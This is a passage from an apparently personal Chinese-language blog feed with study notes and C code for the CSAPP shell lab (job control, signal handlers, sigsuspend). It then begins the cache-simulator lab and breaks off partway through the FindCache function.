parseline(buffer, argv);<br><span class="hljs-comment">// 题目已经定义为bg和fg，所以按照题目意思来定义状态</span><br><span class="hljs-type">int</span> state = is_bg ? BG : FG;<br><span class="hljs-comment">// 如果解析出来是个空的命令行，则直接return</span><br><span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>) &#123;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二步，就比较复杂了。<br>首先想一想，父进程需要做什么？</p><p>父进程</p><ol start="3"><li>创建子进程</li><li>为子进程创建一个对应的job</li><li>根据子进程的类型决定自己是否需要阻塞，等到子进程执行完毕<br>这里有两个注意点</li><li>创建子进程之前父进程需要阻塞掉<code>SIGCHLD</code>信号<ol><li>这个信号是子进程死亡后向父进程发出的信号</li><li>为什么要阻塞这个呢？<ol><li>如果刚创建好子进程，子进程就获得了cpu的使用权</li><li>然后子进程马上就执行完成，发出这个死亡的信号给父进程</li><li>父进程拿到cpu并且受到信号后就需要调用对应的处理函数，这个处理函数需要在job中删除对应项</li><li>但是因为刚创建好子进程之后父进程就没有用过cpu，父进程压根没来得及在job中为子进程创建对应项，所以这个删除操作肯定是失败的</li><li>等父进程拿到cpu之后，才给子进程注册了一个job，可是子进程早就结束了，也就是说父进程永远等不到这个子进程的死亡信号</li><li>因此这个job永远不会被删除</li></ol></li><li>因此在创建子进程之后需要阻塞这个信号，再父进程完成为子进程注册job之后，就可以解除这个阻塞</li></ol></li><li>操作job之前需要阻塞掉所有的信号<ol><li>这个是因为jobs是一个全局变量，为了防止并发的问题，必须要阻塞掉所以的信号，包括切换进程的信号</li><li>这个有点像操作系统的各种锁的作用，保护临界资源的<br>那么子进程需要干嘛呢？</li></ol></li><li>首先，子进程继承了父进程的所有资源，而父进程在创建它之前已经阻塞了SIGCHLD信号量，子进程最好先将这个接触，避免可能的问题</li><li>子进程需要修改自己的组号，刚被创建时是和父进程一个组的。之所以要和父进程不同组，是为了防止子进程收到某些信号影响到同属一个组的父进程，比如对子进程发出kill命令的时候，往往是对子进程所在的组发出kill命令，如果不修改子进程组号，会把父进程也就是shell给kill了。</li><li>根据命令行的输入，使用<code>execve</code>函数启动对应的程序</li><li>终止</li></ol><p>子进程这里需要注意一点，那就是用户输入的程序可能是不存在的，因此，对于execve函数的结果需要特殊处理一下</p><p>整个eval函数的实现如下，其中涉及了一些信号相关的操作比较陌生</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmdline)</span> &#123;<br>  <span class="hljs-comment">// 首先根据cmdline，解析这一行命令。由于我们在解析的函数中修改了传入的cmdline，所以用了一个备份的buffer。</span><br>  <span class="hljs-comment">// 同时解析函数的返回值其实就代表了当前这个被命令行启动的进程是前天还是后台运行的</span><br>  <span class="hljs-comment">// 但是其实好像不备份也行，留坑！</span><br>  <span class="hljs-type">char</span> buffer[MAXLINE];<br>  <span class="hljs-built_in">strcpy</span>(buffer, cmdline);<br>  <span class="hljs-type">char</span> *argv[MAXARGS];<br>  <span class="hljs-type">int</span> is_bg = parseline(buffer, argv);<br>  <span class="hljs-comment">// 题目已经定义为bg和fg，所以按照题目意思来定义状态</span><br>  <span class="hljs-type">int</span> state = is_bg ? BG : FG;<br>  <span class="hljs-comment">// 如果解析出来是个空的命令行，则直接return</span><br>  <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 下面是核心操作部分</span><br>  <span class="hljs-comment">// 创建信号集并初始化，分别是不理会所有信号，不理会一个信号（SIGCHLD），和备份之前的信号</span><br>  <span class="hljs-type">sigset_t</span> all_mask, one_mask, pre_mask;<br>  sigfillset(&amp;all_mask);<br>  sigemptyset(&amp;one_mask);<br>  sigaddset(&amp;one_mask, SIGCHLD);<br>  <span class="hljs-comment">// 如果即将创建的进程不是系统程序，那下面这个函数会返回0</span><br>  <span class="hljs-comment">// 如果是系统程序，那这个函数内部就直接执行了， 不需要我们管了</span><br>  <span class="hljs-comment">// 因此，我们只需要处理非系统程序的情况</span><br>  <span class="hljs-type">pid_t</span> pid;<br>  <span class="hljs-keyword">if</span> (!builtin_cmd(argv)) &#123;<br>    <span class="hljs-comment">// 在调用fork之前就要阻塞SIGCHLD信号</span><br>    sigprocmask(SIG_BLOCK, &amp;one_mask, &amp;pre_mask);<br>    <span class="hljs-keyword">if</span> ((pid = fork()) == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-comment">// 子进程</span><br>      <span class="hljs-comment">// 子进程首先解除从父进程那继承来的阻塞信号</span><br>      sigprocmask(SIG_SETMASK, &amp;pre_mask, <span class="hljs-literal">NULL</span>);<br>      <span class="hljs-comment">// 修改自己的组id为自己的id</span><br>      setpgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>      <span class="hljs-comment">// 创建真正的进程，其中environ是在libc文件中定义的</span><br>      Execve(argv[<span class="hljs-number">0</span>], argv, environ);<br>      <span class="hljs-comment">// 真正的进程执行完之后，子进程也就完成使命了，使用exit终止进程，更加强劲！</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">// 父进程继续操作</span><br>    <span class="hljs-comment">// 首先获取全局锁，因为要修改全局变量了</span><br>    sigprocmask(SIG_BLOCK, &amp;all_mask, <span class="hljs-literal">NULL</span>);<br>    addjob(jobs, pid, state, cmdline);<br>    sigprocmask(SIG_SETMASK, &amp;one_mask, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// 如果是前台进程，则父进程要阻塞到这个前台进程结束</span><br>    <span class="hljs-comment">// 如果是后台进程，则父进程打印这个后台进程的信息</span><br>    <span class="hljs-keyword">if</span> (state == FG) &#123;<br>      waitfg(pid);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);<br>    &#125;<br>    <span class="hljs-comment">// 父进程ok了，可以去接受SIGCHLD信号</span><br>    sigprocmask(SIG_SETMASK, &amp;pre_mask, <span class="hljs-literal">NULL</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h1><p>这个函数就比较简单了，用来判断用户输入的是否是内置的程序</p><p>tsh中要求的内置程序只有<code>quit</code>，<code>bg</code>，<code>fg</code>，<code>jobs</code></p><p>这个实现没什么好说的，可能有点前置的知识那就是，argv这个变量，可以看做一个一维数组，其中</p><p>每个值都是一个字符串</p><ol><li>第一个字符串是程序的名字</li><li>后面的每个字符串都代表了一个参数</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">builtin_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-comment">// 总共要处理 quit bg fg jobs，并&amp;</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;quit&quot;</span>)) &#123;<br>    <span class="hljs-comment">// quit指令，直接终止</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>)) &#123;<br>    <span class="hljs-comment">// 执行bg或者fg</span><br>    do_bgfg(argv);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;jobs&quot;</span>)) &#123;<br>    <span class="hljs-comment">// 列出jobs</span><br>    listjobs(jobs);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h1><p><code>void do_bgfg(char **argv)</code></p><p>这个函数是要我们将某个job唤醒，或者由后台操作变成前台操作</p><ol><li>首先，我们需要知道到底是要变成前台还是后台，这个参数存在<code>argv[0]</code>中</li><li>然后我们需要拿出具体的pid或者jid，其中jid通过%起始以做区别。<ol><li>需要处理这个参数为空情况，即没有给出任何的pid或者jid。</li><li>需要处理输入的pid或者jid非法的情况</li></ol></li><li>通过具体的pid或者jid拿到对应的job，如果找不到这个job，说明不存在</li><li>给这个job发出一个<code>SIGCONT</code>的信号，不管它之前咋样，现在都醒过来</li><li>修改这个job的状态位前台或者后台</li><li>根据前台还是后台，决定当前进程是否需要等待<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">do_bgfg</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-comment">// 后面要用到</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-comment">// 这个函数需要处理多种输入，包括一些非法输入</span><br>  <span class="hljs-comment">// 首先是确认到底是bg操作还是fg操作</span><br>  <span class="hljs-type">int</span> state = (<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) == <span class="hljs-number">0</span>) ? BG : FG;<br><br>  <span class="hljs-comment">// 然后判断是否给出了具体的pid或者jid，如果没有给出正确的参数，那要给出提示</span><br>  <span class="hljs-comment">// 首先看看是否有参数</span><br>  <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 有参数，那就先看看是不是jid</span><br>  <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 使用sscanf尝试获取jid</span><br>    <span class="hljs-type">int</span> jid;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(&amp;argv[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;%d&quot;</span>, &amp;jid) &gt; <span class="hljs-number">0</span>) &#123;<br>      job = getjobjid(jobs, jid);<br>      <span class="hljs-comment">// 如果getjobjid返回null，则说明没有这个job</span><br>      <span class="hljs-keyword">if</span> (job == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%%%d: No such job\n&quot;</span>, jid);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-comment">// 到了这里，那肯定有参数，并且不是jid，但是也有可能是瞎输入的先排除一下</span><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isdigit</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">return</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 肯定输入的是pid了</span><br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;%d&quot;</span>, &amp;pid) &gt; <span class="hljs-number">0</span>) &#123;<br>      job = getjobpid(jobs, pid);<br>      <span class="hljs-keyword">if</span> (job == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, pid);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// 如果能够走到这里，那么说明已经正确取到对应的job了</span><br>  <span class="hljs-comment">// 唤醒这个job，修改状态</span><br>  <span class="hljs-comment">// 这里没有使用进程组，留坑！</span><br>  kill(-job-&gt;pid, SIGCONT);<br>  job-&gt;state = state;<br>  <span class="hljs-comment">// 根据bg或者fg进行特定的操作</span><br>  <span class="hljs-keyword">if</span> (state == BG) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    waitfg(job-&gt;pid);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h1><p><code>void waitfg(pid_t pid)</code></p><p>这个函数需要做到，当pid还是前台程序的时候，调用waitfg的程序一直休眠</p><p>首先，lab已经给我们提供了一个函数<code>fgpid</code>去检查是否还有程序是前台程序</p><ol><li>理论上，我们只需要不断地循环，如果发现还有程序是前台程序，那自己就sleep一下就可以了</li><li>但是这样的话，可能会很浪费时间，因为我们不知道到底要sleep多久</li></ol><p>所以，我们最好还是使用信号的机制，书上介绍了一个很牛逼的函数<code>sigsuspend</code></p><p>具体的优点书上已经详细介绍了，这里不赘述</p><p>这里就有个问题，正常来说，调用这个函数之前，进程应该是阻塞了<code>SIGCHLD</code>信号才对的</p><p>而我的实现里，有两处调用了这个函数，其中do_bgfg是没有阻塞上述的那个信号，但是也没有出现死锁，应该是测试数据太水了导致的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">waitfg</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span> &#123;<br>  <span class="hljs-comment">// 注意，进入这个函数的时候，父进程已经阻塞了子进程可能传来的SIGCHLD信号</span><br>  <span class="hljs-comment">// 而我们使用的sigsuspend函数会让父进程进入一个完全没有阻塞信号的状态</span><br>  <span class="hljs-comment">// 因此，只要有一个子进程挂了，父进程就会跳出阻塞去检查一下是否还有前台进程</span><br>  <span class="hljs-comment">// 感觉有点问题，这里实现的好像太严格了，不只考虑了pid，还考虑所有前台进程，留坑</span><br>  <span class="hljs-type">sigset_t</span> none_mask;<br>  sigemptyset(&amp;none_mask);<br>  <span class="hljs-keyword">while</span> (fgpid(jobs) != pid) &#123;<br>    sigsuspend(&amp;none_mask);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h1><p>这个函数和<code>SIGCHLD</code>信号绑定了，只要有子进程发出这个信号，父进程接收到之后就会使用这个函数去响应</p><ol><li>首先，父进程会使用waitpid函数去看看是否有子进程挂了或者暂停</li><li>然后父进程会根据不同情况去处理<ol><li>子进程正常结束：删除对应的job</li><li>子进程被信号终止：删除对应的job，并打印信息</li><li>子进程被暂停：找到对应的job，修改job的状态为暂停，并打印信息</li></ol></li></ol><p>注意点<br>3. <code>WNOHANG | WUNTRACED</code><br>    1. 第一个参数保证了，就算没有需要处理的子进程，当前进程也不会阻塞住不动<br>    2. 第二个参数保证了，会去响应被暂停的子进程<br>4. 备份errno<br>5. 在修改jobs之前需要阻塞所有信号，作用和之前说的一样，防止并发带来的问题</p><blockquote><p>由于我们不知道到底有多少个死亡信号或者暂停信号到达，所以必须要用while，而不是if</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sigchld_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>  <span class="hljs-type">int</span> olderr = errno;<br>  <span class="hljs-type">pid_t</span> pid;<br>  <span class="hljs-type">int</span> state;<br>  <span class="hljs-type">sigset_t</span> all_mask, pre_mask;<br>  sigfillset(&amp;all_mask);<br>  <span class="hljs-comment">// 不断等待子进程，直到收到一个子进程停止的消息</span><br>  <span class="hljs-keyword">while</span> ((pid = waitpid(<span class="hljs-number">-1</span>, &amp;state, WNOHANG | WUNTRACED)) &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// 因为接下来需要操作jobs这个全局变量，先屏蔽所有的信号</span><br>    sigprocmask(SIG_SETMASK, &amp;all_mask, &amp;pre_mask);<br>    <span class="hljs-comment">// 如果是正常终止，则只需要删除对应的job</span><br>    <span class="hljs-keyword">if</span> (WIFEXITED(state)) &#123;<br>      deletejob(jobs, pid);<br>      <span class="hljs-comment">// 如果是被信号杀死，则还需要输出被哪个信号杀死</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(state)) &#123;<br>      deletejob(jobs, pid);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid,<br>             WTERMSIG(state));<br>      <span class="hljs-comment">// 如果是被信号暂停了，还需要修改对应job的状态</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSTOPPED(state)) &#123;<br>      <span class="hljs-keyword">struct</span> <span class="hljs-type">job_t</span> *job = getjobpid(jobs, pid);<br>      job-&gt;state = ST;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stoped by signal %d\n&quot;</span>, pid2jid(pid), pid,<br>             WSTOPSIG(state));<br>    &#125;<br>    sigprocmask(SIG_SETMASK, &amp;pre_mask, <span class="hljs-literal">NULL</span>);<br>  &#125;<br><br>  errno = olderr;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h1><p>这个函数对应于ctrl c操作，强制杀死前台的进程<br>实现起来很简单：找到当前的前台进程，然后通过kill函数杀死它<br>注意保存和恢复error</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sigint_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>  <span class="hljs-comment">// 前台进程只可能有一个，只要还存在前台进程，那就把这个前台进程给杀掉</span><br>  <span class="hljs-comment">// 感觉这里不加信号量也没问题</span><br>  <span class="hljs-type">int</span> olderr = errno;<br>  <span class="hljs-type">pid_t</span> pid;<br>  <span class="hljs-keyword">if</span> ((pid = fgpid(jobs)) != <span class="hljs-number">0</span>) &#123;<br>    kill(pid, sig);<br>  &#125;<br>  errno = olderr;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="sigtstp-handler"><a href="#sigtstp-handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h1><p>这个函数对应于ctrl z函数，暂停前台进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> olderr = errno;<br><span class="hljs-type">pid_t</span> pid;<br><span class="hljs-keyword">if</span> ((pid = fgpid(jobs)) != <span class="hljs-number">0</span>) &#123;<br>  kill(pid, sig);<br>&#125;<br>errno = olderr;<br></code></pre></td></tr></table></figure><h1 id="留坑"><a href="#留坑" class="headerlink" title="留坑"></a>留坑</h1><ol><li>至今没有搞清楚tsh运行起来之后，到底是咋实现换行的</li><li>总感觉这个做的迷迷糊糊的，没有很理解。接下来把书看一遍，希望能完全弄懂。</li></ol>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab4</title>
    <link href="/2023/08/01/csapp-lab4/"/>
    <url>/2023/08/01/csapp-lab4/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ol><li>修改<code>csim.c</code>实现一个cache，<code>make</code>然后<code>./test-csim</code>测试是否正确</li><li>修改<code>trans.c</code>实现一个转置操作，并优化性能，测试方法如下<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">make &amp;&amp; ./test-trans -M 32 -N 32   <br>make &amp;&amp; ./test-trans -M 64 -N 64  <br>make &amp;&amp; ./test-trans -M 61 -N 67 <br></code></pre></td></tr></table></figure></li></ol><h1 id="模拟cache"><a href="#模拟cache" class="headerlink" title="模拟cache"></a>模拟cache</h1><p>首先，这个实验就是要求我们能够得出在一系列操作之下，命中次数，不命中次数，淘汰页面的次数。</p><h2 id="cacheline的定义"><a href="#cacheline的定义" class="headerlink" title="cacheline的定义"></a>cacheline的定义</h2><p>这个模拟cache的功能非常简单，因为不需要我们真正的去读写数据，只需要模拟进出cache的情况就可以了。因此，我们每个cache行，只需要像下面这样定义即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">int</span> valid;<br>  <span class="hljs-type">int</span> tag;<br>  <span class="hljs-type">int</span> time_stamp;<br>&#125; cache_line;<br></code></pre></td></tr></table></figure><h2 id="cache的操作"><a href="#cache的操作" class="headerlink" title="cache的操作"></a>cache的操作</h2><p>然后我们需要支持三种操作，分别是load，store和modify</p><ol><li>load的意思很明显，就是先去cache中检查， 如果有这一行，那么就命中，如果不成功，那么就需要找出一个空行，或者根据lru找出一行来替换</li><li>store呢，其实在不考虑实际的写入写出的情况下，和load的操作一模一样，如果cache有这一行，那么就命中了，直接store进去，如果没有这一行，需要读入cache。那其实这个时候就没必要store回内存了，因为刚刚才从内存里读出来。我是感觉这里有点奇怪的。</li><li>modiy在实验文档里也说了，等于load+store</li></ol><p>综上所述，load和store的实现完全一样，modify相当于再操作一次。对应在代码里就是这样。<br>这个函数的第一行和第二行就是使用位运算取出了这个地址的set和tag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Func</span><span class="hljs-params">(<span class="hljs-type">char</span> command, <span class="hljs-type">int</span> address, <span class="hljs-type">int</span> size)</span> &#123;<br>  <span class="hljs-type">int</span> set_num = (address &gt;&gt; b) &amp; ((<span class="hljs-number">1</span> &lt;&lt; s) - <span class="hljs-number">1</span>);<br>  <span class="hljs-type">int</span> tag = (address &gt;&gt; (b + s)) &amp; ((<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">32</span> - b - s)) - <span class="hljs-number">1</span>);<br>  FindCache(set_num, tag);<br>  <span class="hljs-keyword">if</span> (command == <span class="hljs-string">&#x27;M&#x27;</span>) &#123;<br>    FindCache(set_num, tag);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="关键的FindCache函数"><a href="#关键的FindCache函数" class="headerlink" title="关键的FindCache函数"></a>关键的FindCache函数</h2><p>通过这个函数可以发现，其实真正关键的函数是FindCache函数。<br>这个函数其实就是遍历这个对应的set的所有行</p><ol><li>如果命中了，则更新命中的次数，更新时间戳，然后直接返回</li><li>如果没命中，我们在遍历所有行的过程中需要记录是否存在空行，并且记录时间戳最小的行（LRU）。<ol><li>首先，更新miss的次数</li><li>如果存在空行，则将当前这一行写入空行，并更新valid，tag，和时间戳</li><li>如果不存在空间，则将当前这一行写入时间戳最小的行，并和2一样更新各种参数。这种情况还要额外更新一个淘汰页的数量<br>具体实现如下<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">FindCache</span><span class="hljs-params">(<span class="hljs-type">int</span> set_num, <span class="hljs-type">int</span> tag)</span> &#123;<br>  cache_line 